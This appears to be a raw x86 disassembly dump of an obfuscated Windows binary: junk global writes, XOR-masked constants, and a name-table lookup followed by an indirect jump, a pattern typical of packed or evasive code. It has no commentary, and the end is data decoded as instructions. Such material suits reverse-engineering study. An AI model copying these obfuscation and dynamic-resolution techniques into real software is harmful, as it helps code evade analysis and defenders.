  4218bd:	pop    esi
  4218be:	div    esi
  4218c0:	imul   eax,eax,0x3fb9
  4218c6:	mov    edx,DWORD PTR [ebp-0x3c]
  4218c9:	and    edx,0x58c7
  4218cf:	mov    esi,DWORD PTR [ebp-0x124]
  4218d5:	or     edx,esi
  4218d7:	add    edx,0x7a25
  4218dd:	imul   edx,edx,0x28d2
  4218e3:	mov    esi,DWORD PTR [ebp-0x58]
  4218e6:	xor    edx,esi
  4218e8:	xor    edx,0x1856f731
  4218ee:	mov    esi,DWORD PTR [ebp-0xe8]
  4218f4:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  4218fb:	add    eax,ecx
  4218fd:	add    edx,eax
  4218ff:	mov    DWORD PTR [ebp-0xac],edx
  421905:	mov    DWORD PTR [ebp-0x54],0x1
  42190c:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421913:	mov    DWORD PTR [ebp-0x1c],0x64d8
  42191a:	mov    DWORD PTR [ebp-0xf0],0x5a06
  421924:	mov    DWORD PTR [ebp-0x108],0x2eeb
  42192e:	mov    DWORD PTR [ebp-0x104],0x2108
  421938:	mov    eax,DWORD PTR [ebp-0x1c]
  42193b:	xor    edx,edx
  42193d:	push   0x3
  42193f:	pop    ecx
  421940:	div    ecx
  421942:	mov    ecx,DWORD PTR [ebp-0x40]
  421945:	or     eax,ecx
  421947:	mov    ecx,DWORD PTR [ebp-0x54]
  42194a:	xor    edx,edx
  42194c:	div    ecx
  42194e:	imul   eax,eax,0x7d53
  421954:	mov    ecx,DWORD PTR [ebp+0x8]
  421957:	lea    eax,[ecx+eax*1-0x1f534807]
  42195e:	mov    ecx,DWORD PTR [ebp-0xf0]
  421964:	and    ecx,0x4108
  42196a:	and    ecx,0x40e7
  421970:	sub    ecx,0x1a54
  421976:	xor    ecx,0x25ac
  42197c:	mov    edx,DWORD PTR [ebp-0x104]
  421982:	xor    edx,0x6dda
  421988:	mov    esi,DWORD PTR [ebp-0x108]
  42198e:	and    edx,esi
  421990:	and    edx,0xe0c
  421996:	or     edx,0x5b
  421999:	mov    esi,DWORD PTR [ebp-0xe8]
  42199f:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219a3:	add    ecx,eax
  4219a5:	lea    eax,[edx+ecx*1-0xc5b]
  4219ac:	mov    DWORD PTR [ebp-0xa8],eax
  4219b2:	and    DWORD PTR [ebp-0x144],0x0
  4219b9:	jmp    0x4219cb
  4219be:	mov    eax,DWORD PTR [ebp-0x144]
  4219c4:	inc    eax
  4219c5:	mov    DWORD PTR [ebp-0x144],eax
  4219cb:	mov    eax,DWORD PTR [ebp-0xe8]
  4219d1:	mov    ecx,DWORD PTR [ebp-0x144]
  4219d7:	cmp    ecx,DWORD PTR [eax+0x18]
  4219da:	je     0x421f93
  4219e0:	mov    eax,DWORD PTR [ebp-0x144]
  4219e6:	mov    ecx,DWORD PTR [ebp-0x38]
  4219e9:	mov    edx,DWORD PTR [ebp+0x8]
  4219ec:	add    edx,DWORD PTR [ecx+eax*4]
  4219ef:	mov    DWORD PTR [ebp-0x48],edx
  4219f2:	mov    eax,DWORD PTR [ebp-0x48]
  4219f5:	mov    DWORD PTR [ebp-0x210],eax
  4219fb:	mov    eax,DWORD PTR [ebp+0xc]
  4219fe:	mov    DWORD PTR [ebp-0x20c],eax
  421a04:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a0e:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a18:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a22:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a2c:	lea    eax,[ebp-0x1e8]
  421a32:	mov    DWORD PTR [ebp-0x1f4],eax
  421a38:	mov    eax,DWORD PTR [ebp-0x20c]
  421a3e:	movzx  eax,WORD PTR [eax+0x20]
  421a42:	xor    eax,0xa49b
  421a47:	movzx  eax,ax
  421a4a:	sar    eax,1
  421a4c:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a52:	movzx  ecx,WORD PTR [ecx+0x20]
  421a56:	xor    ecx,0xa49b
  421a5c:	movzx  ecx,cx
  421a5f:	shl    ecx,0xf
  421a62:	or     eax,ecx
  421a64:	movzx  eax,ax
  421a67:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a6d:	mov    DWORD PTR [ecx],eax
  421a6f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a75:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a7b:	xor    eax,0xca79a575
  421a80:	xor    edx,0x9c1b89e8
  421a86:	mov    cl,0x2
  421a88:	call   0x40a9b5
  421a8d:	mov    ebx,eax
  421a8f:	mov    esi,edx
  421a91:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a97:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a9d:	xor    eax,0xca79a575
  421aa2:	xor    edx,0x9c1b89e8
  421aa8:	mov    cl,0x3e
  421aaa:	call   0x422227
  421aaf:	or     ebx,eax
  421ab1:	or     esi,edx
  421ab3:	movzx  eax,bl
  421ab6:	push   eax
  421ab7:	lea    eax,[ebp-0x198]
  421abd:	push   eax
  421abe:	call   0x416c9e
  421ac3:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ac9:	mov    edx,DWORD PTR [ebp-0x1ec]
  421acf:	xor    eax,0xca79a575
  421ad4:	xor    edx,0x9c1b89e8
  421ada:	mov    cl,0x2
  421adc:	call   0x40a9b5
  421ae1:	mov    esi,eax
  421ae3:	mov    edi,edx
  421ae5:	mov    eax,DWORD PTR [ebp-0x1f0]
  421aeb:	mov    edx,DWORD PTR [ebp-0x1ec]
  421af1:	xor    eax,0xca79a575
  421af6:	xor    edx,0x9c1b89e8
  421afc:	mov    cl,0x3e
  421afe:	call   0x422227
  421b03:	or     esi,eax
  421b05:	or     edi,edx
  421b07:	mov    DWORD PTR [ebp-0x1f8],esi
  421b0d:	jmp    0x421b62
  421b12:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b18:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b1e:	xor    eax,0xca79a575
  421b23:	xor    edx,0x9c1b89e8
  421b29:	mov    cl,0x2
  421b2b:	call   0x40a9b5
  421b30:	mov    esi,eax
  421b32:	mov    edi,edx
  421b34:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b3a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b40:	xor    eax,0xca79a575
  421b45:	xor    edx,0x9c1b89e8
  421b4b:	mov    cl,0x3e
  421b4d:	call   0x422227
  421b52:	or     esi,eax
  421b54:	or     edi,edx
  421b56:	add    esi,DWORD PTR [ebp-0x1f8]
  421b5c:	mov    DWORD PTR [ebp-0x1f8],esi
  421b62:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b68:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b6e:	je     0x421c01
  421b74:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b7a:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b80:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b85:	xor    eax,0xa49b
  421b8a:	movzx  eax,ax
  421b8d:	sar    eax,1
  421b8f:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421b95:	mov    edx,DWORD PTR [ebp-0x20c]
  421b9b:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421ba0:	xor    ecx,0xa49b
  421ba6:	movzx  ecx,cx
  421ba9:	shl    ecx,0xf
  421bac:	or     eax,ecx
  421bae:	movzx  eax,ax
  421bb1:	mov    DWORD PTR [ebp-0x1fc],eax
  421bb7:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bbd:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bc3:	movzx  eax,WORD PTR [ecx+eax*4]
  421bc7:	xor    eax,0xa49b
  421bcc:	movzx  eax,ax
  421bcf:	sar    eax,1
  421bd1:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bd7:	mov    edx,DWORD PTR [ebp-0x20c]
  421bdd:	movzx  ecx,WORD PTR [edx+ecx*4]
  421be1:	xor    ecx,0xa49b
  421be7:	movzx  ecx,cx
  421bea:	shl    ecx,0xf
  421bed:	or     eax,ecx
  421bef:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421bf5:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421bfc:	jmp    0x421b12
  421c01:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c07:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c0d:	xor    eax,0xca79a575
  421c12:	xor    edx,0x9c1b89e8
  421c18:	mov    cl,0x2
  421c1a:	call   0x40a9b5
  421c1f:	mov    esi,eax
  421c21:	mov    edi,edx
  421c23:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c29:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c2f:	xor    eax,0xca79a575
  421c34:	xor    edx,0x9c1b89e8
  421c3a:	mov    cl,0x3e
  421c3c:	call   0x422227
  421c41:	or     esi,eax
  421c43:	or     edi,edx
  421c45:	mov    DWORD PTR [ebp-0x1e4],esi
  421c4b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c51:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c57:	xor    eax,0xca79a575
  421c5c:	xor    edx,0x9c1b89e8
  421c62:	mov    cl,0x2
  421c64:	call   0x40a9b5
  421c69:	mov    esi,eax
  421c6b:	mov    edi,edx
  421c6d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c73:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c79:	xor    eax,0xca79a575
  421c7e:	xor    edx,0x9c1b89e8
  421c84:	mov    cl,0x3e
  421c86:	call   0x422227
  421c8b:	or     esi,eax
  421c8d:	or     edi,edx
  421c8f:	mov    DWORD PTR [ebp-0x23c],esi
  421c95:	mov    DWORD PTR [ebp-0x238],edi
  421c9b:	mov    eax,DWORD PTR [ebp-0x23c]
  421ca1:	or     eax,DWORD PTR [ebp-0x238]
  421ca7:	je     0x421f07
  421cad:	lea    eax,[ebp-0x204]
  421cb3:	mov    DWORD PTR [ebp-0x208],eax
  421cb9:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cbf:	xor    edx,edx
  421cc1:	mov    cl,0x2
  421cc3:	call   0x422227
  421cc8:	mov    esi,eax
  421cca:	mov    edi,edx
  421ccc:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cd2:	xor    edx,edx
  421cd4:	mov    cl,0x3e
  421cd6:	call   0x40a9b5
  421cdb:	or     esi,eax
  421cdd:	or     edi,edx
  421cdf:	xor    esi,0xca79a575
  421ce5:	xor    edi,0x9c1b89e8
  421ceb:	mov    eax,DWORD PTR [ebp-0x208]
  421cf1:	mov    DWORD PTR [eax],esi
  421cf3:	mov    DWORD PTR [eax+0x4],edi
  421cf6:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cfc:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d04:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d0a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d10:	xor    eax,0xca79a575
  421d15:	xor    edx,0x9c1b89e8
  421d1b:	mov    cl,0x2
  421d1d:	call   0x40a9b5
  421d22:	mov    ebx,eax
  421d24:	mov    edi,edx
  421d26:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d2c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d32:	xor    eax,0xca79a575
  421d37:	xor    edx,0x9c1b89e8
  421d3d:	mov    cl,0x3e
  421d3f:	call   0x422227
  421d44:	or     ebx,eax
  421d46:	or     edi,edx
  421d48:	movsx  eax,bl
  421d4b:	cmp    esi,eax
  421d4d:	je     0x421ead
  421d53:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d59:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d61:	mov    eax,DWORD PTR [ebp-0x204]
  421d67:	mov    edx,DWORD PTR [ebp-0x200]
  421d6d:	xor    eax,0xca79a575
  421d72:	xor    edx,0x9c1b89e8
  421d78:	mov    cl,0x2
  421d7a:	call   0x40a9b5
  421d7f:	mov    edi,eax
  421d81:	mov    ebx,edx
  421d83:	mov    eax,DWORD PTR [ebp-0x204]
  421d89:	mov    edx,DWORD PTR [ebp-0x200]
  421d8f:	xor    eax,0xca79a575
  421d94:	xor    edx,0x9c1b89e8
  421d9a:	mov    cl,0x3e
  421d9c:	call   0x422227
  421da1:	or     edi,eax
  421da3:	or     ebx,edx
  421da5:	mov    eax,DWORD PTR [ebp-0x210]
  421dab:	movsx  eax,BYTE PTR [eax+edi*1]
  421daf:	cmp    esi,eax
  421db1:	je     0x421dc1
  421db7:	jmp    0x421f07
  421dbc:	jmp    0x421ead
  421dc1:	mov    eax,DWORD PTR [ebp-0x204]
  421dc7:	mov    edx,DWORD PTR [ebp-0x200]
  421dcd:	xor    eax,0xca79a575
  421dd2:	xor    edx,0x9c1b89e8
  421dd8:	mov    cl,0x2
  421dda:	call   0x40a9b5
  421ddf:	mov    esi,eax
  421de1:	mov    edi,edx
  421de3:	mov    eax,DWORD PTR [ebp-0x204]
  421de9:	mov    edx,DWORD PTR [ebp-0x200]
  421def:	xor    eax,0xca79a575
  421df4:	xor    edx,0x9c1b89e8
  421dfa:	mov    cl,0x3e
  421dfc:	call   0x422227
  421e01:	or     esi,eax
  421e03:	or     edi,edx
  421e05:	mov    eax,DWORD PTR [ebp-0x210]
  421e0b:	movsx  esi,BYTE PTR [eax+esi*1]
  421e0f:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e15:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e1b:	xor    eax,0xca79a575
  421e20:	xor    edx,0x9c1b89e8
  421e26:	mov    cl,0x2
  421e28:	call   0x40a9b5
  421e2d:	mov    ebx,eax
  421e2f:	mov    edi,edx
  421e31:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e37:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e3d:	xor    eax,0xca79a575
  421e42:	xor    edx,0x9c1b89e8
  421e48:	mov    cl,0x3e
  421e4a:	call   0x422227
  421e4f:	or     ebx,eax
  421e51:	or     edi,edx
  421e53:	movsx  eax,bl
  421e56:	cmp    esi,eax
  421e58:	jne    0x421ead
  421e5e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e64:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e6a:	xor    eax,0xca79a575
  421e6f:	xor    edx,0x9c1b89e8
  421e75:	mov    cl,0x2
  421e77:	call   0x40a9b5
  421e7c:	mov    esi,eax
  421e7e:	mov    edi,edx
  421e80:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e86:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e8c:	xor    eax,0xca79a575
  421e91:	xor    edx,0x9c1b89e8
  421e97:	mov    cl,0x3e
  421e99:	call   0x422227
  421e9e:	or     esi,eax
  421ea0:	or     edi,edx
  421ea2:	mov    DWORD PTR [ebp-0x214],esi
  421ea8:	jmp    0x421f51
  421ead:	mov    eax,DWORD PTR [ebp-0x1e0]
  421eb3:	mov    edx,DWORD PTR [ebp-0x1dc]
  421eb9:	xor    eax,0xca79a575
  421ebe:	xor    edx,0x9c1b89e8
  421ec4:	mov    cl,0x2
  421ec6:	call   0x40a9b5
  421ecb:	mov    esi,eax
  421ecd:	mov    edi,edx
  421ecf:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ed5:	mov    edx,DWORD PTR [ebp-0x1dc]
  421edb:	xor    eax,0xca79a575
  421ee0:	xor    edx,0x9c1b89e8
  421ee6:	mov    cl,0x3e
  421ee8:	call   0x422227
  421eed:	or     esi,eax
  421eef:	or     edi,edx
  421ef1:	add    esi,DWORD PTR [ebp-0x1e4]
  421ef7:	mov    DWORD PTR [ebp-0x1e4],esi
  421efd:	jmp    0x421c4b
  421f02:	jmp    0x421c4b
  421f07:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f0d:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f13:	xor    eax,0xca79a575
  421f18:	xor    edx,0x9c1b89e8
  421f1e:	mov    cl,0x2
  421f20:	call   0x40a9b5
  421f25:	mov    esi,eax
  421f27:	mov    edi,edx
  421f29:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f2f:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f35:	xor    eax,0xca79a575
  421f3a:	xor    edx,0x9c1b89e8
  421f40:	mov    cl,0x3e
  421f42:	call   0x422227
  421f47:	or     esi,eax
  421f49:	or     edi,edx
  421f4b:	mov    DWORD PTR [ebp-0x214],esi
  421f51:	mov    eax,DWORD PTR [ebp-0x214]
  421f57:	mov    DWORD PTR [ebp-0xc8],eax
  421f5d:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f64:	je     0x421f8e
  421f6a:	mov    eax,DWORD PTR [ebp-0x144]
  421f70:	mov    ecx,DWORD PTR [ebp-0xac]
  421f76:	movzx  eax,WORD PTR [ecx+eax*2]
  421f7a:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f80:	mov    eax,DWORD PTR [ecx+eax*4]
  421f83:	mov    DWORD PTR [ebp-0xfc],eax
  421f89:	jmp    0x421f93
  421f8e:	jmp    0x4219be
  421f93:	cmp    DWORD PTR [ebp-0xfc],0x0
  421f9a:	jne    0x421fa7
  421fa0:	xor    eax,eax
  421fa2:	jmp    0x422220
  421fa7:	mov    eax,DWORD PTR [ebp+0x8]
  421faa:	add    eax,DWORD PTR [ebp-0xfc]
  421fb0:	mov    DWORD PTR [ebp-0xec],eax
  421fb6:	mov    DWORD PTR [ebp-0x74],0x0
  421fbd:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fc4:	je     0x422040
  421fca:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fd1:	je     0x422040
  421fd7:	mov    eax,DWORD PTR [ebp-0xb0]
  421fdd:	shl    eax,0x2
  421fe0:	mov    DWORD PTR [ebp-0x74],eax
  421fe3:	mov    DWORD PTR [ebp-0x14c],0x0
  421fed:	sub    esp,DWORD PTR [ebp-0x74]
  421ff0:	mov    DWORD PTR [ebp-0x14c],esp
  421ff6:	mov    DWORD PTR [ebp-0x148],0x0
  422000:	mov    eax,DWORD PTR [ebp-0x148]
  422006:	cmp    eax,DWORD PTR [ebp-0xb0]
  42200c:	je     0x422040
  422012:	mov    eax,DWORD PTR [ebp-0x148]
  422018:	mov    ecx,DWORD PTR [ebp-0x14c]
  42201e:	mov    edx,DWORD PTR [ebp-0x148]
  422024:	mov    esi,DWORD PTR [ebp+0x14]
  422027:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  42202b:	mov    DWORD PTR [ecx+eax*4],edx
  42202e:	mov    eax,DWORD PTR [ebp-0x148]
  422034:	inc    eax
  422035:	mov    DWORD PTR [ebp-0x148],eax
  42203b:	jmp    0x422000
  422040:	mov    DWORD PTR [ebp-0x9c],0x0
  42204a:	push   0x4221d9
  42204f:	jmp    DWORD PTR [ebp-0xec]
  422055:	mov    eax,eax
  422057:	mov    ecx,esp
  422059:	ret    0xc
  42205c:	cmp    DWORD PTR ds:0x4282ef,0x0
  422063:	mov    DWORD PTR ds:0x4282eb,0x7476
  42206d:	mov    DWORD PTR ds:0x428167,0x1cdc
  422077:	mov    DWORD PTR ds:0x4282eb,0x65fa
  422081:	mov    DWORD PTR ds:0x428157,0x5dca
  42208b:	jmp    0x4220d5
  422090:	mov    eax,ds:0x4282e7
  422095:	cmp    DWORD PTR ds:0x4282ef,0x0
  42209c:	jbe    0x4220bd
  4220a2:	push   0x24f1
  4220a7:	call   DWORD PTR ds:0x428d68
  4220ad:	inc    DWORD PTR ds:0x428393
  4220b3:	sub    DWORD PTR ds:0x428173,0x46d9
  4220bd:	inc    DWORD PTR ds:0x4282ef
  4220c3:	adc    DWORD PTR ds:0x4282fb,ebx
  4220c9:	or     DWORD PTR ds:0x428223,0x4029
  4220d3:	not    eax
  4220d5:	push   ebx
  4220d6:	push   esi
  4220d7:	sbb    DWORD PTR ds:0x42837f,edx
  4220dd:	mov    eax,DWORD PTR [esp+0x18]
  4220e1:	or     eax,eax
  4220e3:	jne    0x422113
  4220e9:	mov    ecx,DWORD PTR [esp+0x14]
  4220ed:	mov    eax,DWORD PTR [esp+0x10]
  4220f1:	xor    edx,edx
  4220f3:	div    ecx
  4220f5:	xor    DWORD PTR ds:0x42817f,0x45f1
  4220ff:	mov    ebx,eax
  422101:	mov    eax,DWORD PTR [esp+0xc]
  422105:	div    ecx
  422107:	mov    edx,0x36e3
  42210c:	mov    edx,ebx
  42210e:	jmp    0x4221d4
  422113:	mov    ecx,eax
  422115:	sbb    eax,0x67a9
  42211a:	mov    ebx,DWORD PTR [esp+0x14]
  42211e:	cmp    DWORD PTR ds:0x4282e7,0x0
  422125:	mov    edx,DWORD PTR ds:0x428397
  42212b:	mov    DWORD PTR ds:0x428317,0x4bc7
  422135:	mov    edx,DWORD PTR ds:0x4282ff
  42213b:	jmp    0x422185
  422140:	mov    DWORD PTR ds:0x428247,0x15f
  42214a:	mov    DWORD PTR ds:0x42827f,0x4dd1
  422154:	cmp    DWORD PTR ds:0x4282e7,0x0
  42215b:	jle    0x422178
  422161:	push   0x824e
  422166:	call   DWORD PTR ds:0x428d6c
  42216c:	xor    DWORD PTR ds:0x4282ff,0x6c44
  422176:	sub    edx,edx
  422178:	sbb    DWORD PTR ds:0x428247,0x445e
  422182:	dec    edx
  422183:	not    edx
  422185:	mov    edx,DWORD PTR [esp+0x10]
  422189:	mov    eax,DWORD PTR [esp+0xc]
  42218d:	shr    ecx,1
  42218f:	rcr    ebx,1
  422191:	shr    edx,1
  422193:	rcr    eax,1
  422195:	or     ecx,ecx
  422197:	jne    0x42218d
  42219d:	div    ebx
  42219f:	mov    esi,eax
  4221a1:	mul    DWORD PTR [esp+0x18]
  4221a5:	mov    ecx,eax
  4221a7:	mov    eax,DWORD PTR [esp+0x14]
  4221ab:	mul    esi
  4221ad:	add    edx,ecx
  4221af:	jb     0x4221cf
  4221b5:	cmp    edx,DWORD PTR [esp+0x10]
  4221b9:	ja     0x4221cf
  4221bf:	jb     0x4221d0
  4221c5:	cmp    eax,DWORD PTR [esp+0xc]
  4221c9:	jbe    0x4221d0
  4221cf:	dec    esi
  4221d0:	xor    edx,edx
  4221d2:	mov    eax,esi
  4221d4:	pop    esi
  4221d5:	pop    ebx
  4221d6:	ret    0x10
  4221d9:	or     DWORD PTR ds:0x428363,0x42836f
  4221e3:	sub    DWORD PTR [ebp+0x10],0x1
  4221e7:	mov    DWORD PTR ds:0x42816b,0x43bf
  4221f1:	cmp    DWORD PTR [ebp+0x10],0x0
  4221f5:	mov    DWORD PTR ds:0x42835b,0x612a
  4221ff:	je     0x42220e
  422205:	xor    DWORD PTR ds:0x428157,edx
  42220b:	add    esp,DWORD PTR [ebp-0x74]
  42220e:	mov    DWORD PTR [ebp-0x9c],eax
  422214:	mov    DWORD PTR ds:0x42825f,ebx
  42221a:	mov    eax,DWORD PTR [ebp-0x9c]
  422220:	pop    edi
  422221:	pop    esi
  422222:	pop    ebx
  422223:	leave  
  422224:	ret    0x10
  422227:	cmp    cl,0x40
  42222a:	mov    DWORD PTR ds:0x428243,0x43a8
  422234:	jae    0x422286
  42223a:	mov    DWORD PTR ds:0x428177,0x42f2
  422244:	cmp    cl,0x20
  422247:	mov    DWORD PTR ds:0x42815f,0x3d58
  422251:	jae    0x422271
  422257:	or     DWORD PTR ds:0x428153,0x5e1e
  422261:	shld   edx,eax,cl
  422264:	mov    DWORD PTR ds:0x428277,0x1bd2
  42226e:	shl    eax,cl
  422270:	ret    
  422271:	inc    edx
  422272:	mov    edx,eax
  422274:	sub    DWORD PTR ds:0x428393,0x4282eb
  42227e:	xor    eax,eax
  422280:	and    cl,0x1f
  422283:	shl    edx,cl
  422285:	ret    
  422286:	xor    eax,eax
  422288:	xor    edx,edx
  42228a:	ret    
  42228b:	add    BYTE PTR [eax],al
  42228d:	add    BYTE PTR [eax],al
  42228f:	add    cl,ch
  422291:	cmp    ebp,DWORD PTR [ebx+0x14]
  422294:	cmp    al,0x26
  422296:	sub    al,0x44
  422298:	jno    0x422303
  42229a:	ja     0x422301
  42229c:	int3   
  42229d:	fsubr  QWORD PTR [edx+0x1e]
  4222a0:	jo     0x422307
  4222a2:	popa   
  4222a3:	ins    BYTE PTR es:[edi],dx
  4222a4:	push   eax
  4222a5:	lods   eax,DWORD PTR ds:[esi]
  4222a6:	xor    DWORD PTR [esi+0x41],edi
  4222a9:	ins    BYTE PTR es:[edi],dx
  4222aa:	popa   
  4222ab:	outs   dx,BYTE PTR ds:[esi]
  4222ac:	add    BYTE PTR [eax],al
  4222ae:	add    BYTE PTR [eax],al
  4222b0:	addr16 jb 0x422318
  4222b3:	popa   
  4222b4:	je     0x42231d
  4222b6:	jb     0x42231d
  4222b8:	popa   
  4222b9:	je     0x422322
  4222bb:	jb     0x422322
  4222bd:	popa   
  4222be:	je     0x422327
  4222c0:	jb     0x422327
  4222c2:	popa   
  4222c3:	je     0x42232c
  4222c5:	jb     0x42232c
  4222c7:	popa   
  4222c8:	je     0x422331
  4222ca:	jb     0x422331
  4222cc:	popa   
  4222cd:	je     0x422336
  4222cf:	jb     0x422336
  4222d1:	popa   
  4222d2:	je     0x42233b
  4222d4:	jb     0x42233b
  4222d6:	popa   
  4222d7:	je     0x422340
  4222d9:	jb     0x422340
  4222db:	popa   
  4222dc:	je     0x422345
  4222de:	jb     0x422345
  4222e0:	popa   
  4222e1:	je     0x4222e3
  4222e3:	add    BYTE PTR [eax+0x65],ch
  4222e6:	ins    BYTE PTR es:[edi],dx
  4222e7:	ins    BYTE PTR es:[edi],dx
  4222e8:	push   0x686c6c65
  4222ed:	gs ins BYTE PTR es:[edi],dx
  4222ef:	ins    BYTE PTR es:[edi],dx
  4222f0:	push   0x686c6c65
  4222f5:	gs ins BYTE PTR es:[edi],dx
  4222f7:	ins    BYTE PTR es:[edi],dx
  4222f8:	push   0x686c6c65
  4222fd:	gs ins BYTE PTR es:[edi],dx
  4222ff:	ins    BYTE PTR es:[edi],dx
  422300:	push   0x686c6c65
  422305:	gs ins BYTE PTR es:[edi],dx
  422307:	ins    BYTE PTR es:[edi],dx
  422308:	push   0x686c6c65
  42230d:	gs ins BYTE PTR es:[edi],dx
  42230f:	ins    BYTE PTR es:[edi],dx
  422310:	push   0x686c6c65
  422315:	gs ins BYTE PTR es:[edi],dx
  422317:	ins    BYTE PTR es:[edi],dx
  422318:	add    BYTE PTR [eax],al
  42231a:	add    BYTE PTR [eax],al
  42231c:	outs   dx,DWORD PTR ds:[esi]
  42231d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422321:	add    BYTE PTR [ecx+0x0],ah
  422324:	jne    0x422326
  422326:	je     0x422328
  422328:	xor    eax,DWORD PTR [eax]
  42232a:	xor    al,BYTE PTR [eax]
  42232c:	add    BYTE PTR [eax],al
  42232e:	add    BYTE PTR [eax],al
  422330:	push   0x61006500
  422335:	add    BYTE PTR [esi+0x0],dh
  422338:	add    BYTE PTR gs:[esi+0x0],ch
  42233c:	push   0x61006500
  422341:	add    BYTE PTR [esi+0x0],dh
  422344:	add    BYTE PTR gs:[esi+0x0],ch
  422348:	push   0x61006500
  42234d:	add    BYTE PTR [esi+0x0],dh
  422350:	add    BYTE PTR gs:[esi+0x0],ch
  422354:	push   0x61006500
  422359:	add    BYTE PTR [esi+0x0],dh
  42235c:	add    BYTE PTR gs:[esi+0x0],ch
  422360:	push   0x61006500
  422365:	add    BYTE PTR [esi+0x0],dh
  422368:	add    BYTE PTR gs:[esi+0x0],ch
  42236c:	push   0x61006500
  422371:	add    BYTE PTR [esi+0x0],dh
  422374:	add    BYTE PTR gs:[esi+0x0],ch
  422378:	push   0x61006500
  42237d:	add    BYTE PTR [esi+0x0],dh
  422380:	add    BYTE PTR gs:[esi+0x0],ch
  422384:	push   0x61006500
  422389:	add    BYTE PTR [esi+0x0],dh
  42238c:	add    BYTE PTR gs:[esi+0x0],ch
  422390:	push   0x61006500
  422395:	add    BYTE PTR [esi+0x0],dh
  422398:	add    BYTE PTR gs:[esi+0x0],ch
  42239c:	add    BYTE PTR [eax],al
  42239e:	add    BYTE PTR [eax],al
  4223a0:	sbb    al,0x23
  4223a2:	inc    edx
  4223a3:	add    BYTE PTR [edi+0x6c],cl
  4223a6:	gs dec ecx
  4223a8:	arpl   WORD PTR [edi+0x6e],bp
  4223ab:	push   esp
  4223ac:	outs   dx,DWORD PTR ds:[esi]
  4223ad:	inc    ebx
  4223ae:	jne    0x422422
  4223b0:	jae    0x422421
  4223b2:	jb     0x4223b4
  4223b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223b5:	and    eax,DWORD PTR [edx+0x0]
	...
  4223c0:	pusha  
  4223c1:	daa    
  4223c2:	inc    edx
  4223c3:	add    BYTE PTR [eax+0x27],ch
  4223c6:	inc    edx
  4223c7:	add    BYTE PTR [eax],ah
  4223c9:	es inc edx
  4223cb:	add    dl,dh
  4223cd:	inc    ebx
  4223ce:	push   ebx
  4223cf:	mov    WORD PTR ds:0x1a49ba4,ss
  4223d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d6:	popf   
  4223d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d8:	jno    0x42237e
  4223da:	xchg   edi,eax
  4223db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223dc:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
